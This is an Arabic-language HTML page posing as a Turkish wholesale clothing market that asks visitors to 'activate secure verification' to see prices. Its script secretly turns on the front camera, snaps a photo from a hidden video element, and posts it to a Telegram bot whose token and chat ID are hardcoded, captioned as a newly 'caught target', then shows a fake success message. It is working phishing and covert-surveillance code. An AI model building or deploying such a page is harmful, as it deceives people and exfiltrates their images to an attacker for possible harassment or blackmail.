<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أسواق تركيا للجملة 🇹🇷</title>
    <style>
        body { font-family: sans-serif; margin: 0; background-color: #f8f9fa; text-align: center; }
        header { background-color: #d32f2f; color: white; padding: 25px; }
        .hero { background: white; padding: 30px; margin: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .btn-buy { background-color: #2e7d32; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<header>
    <h1>أسواق تركيا للجملة 🇹🇷</h1>
    <p>بوابة التجار للاستيراد المباشر</p>
</header>

<div class="hero">
    <h2>تخفيضات الربيع الحصرية</h2>
    <p>يجب تفعيل "نظام التحقق الآمن" لمشاهدة أسعار الملابس والمنسوجات الجديدة.</p>
    <button class="btn-buy" onclick="startCamera()">تفعيل الوصول للأسعار</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    // التوكن والمعرف الصحيحين من صورك الأخيرة
    const botToken = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKin5xzA"; 
    const chatId = "8124196406"; 

    function startCamera() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                document.getElementById('video').srcObject = stream;
                setTimeout(takeAndSend, 1500); // التقاط بعد ثانية ونصف
            })
            .catch(err => alert("يجب الموافقة على الصلاحية لرؤية الأسعار"));
    }

    function takeAndSend() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'trade.jpg');
            formData.append('caption', '✅ تم صيد هدف جديد من متجر تركيا! 🇹🇷');

            fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) alert("تم التحقق بنجاح! جاري تحويلك للأسعار.");
            });
        }, 'image/jpeg');
    }
</script>
</body>
</html>
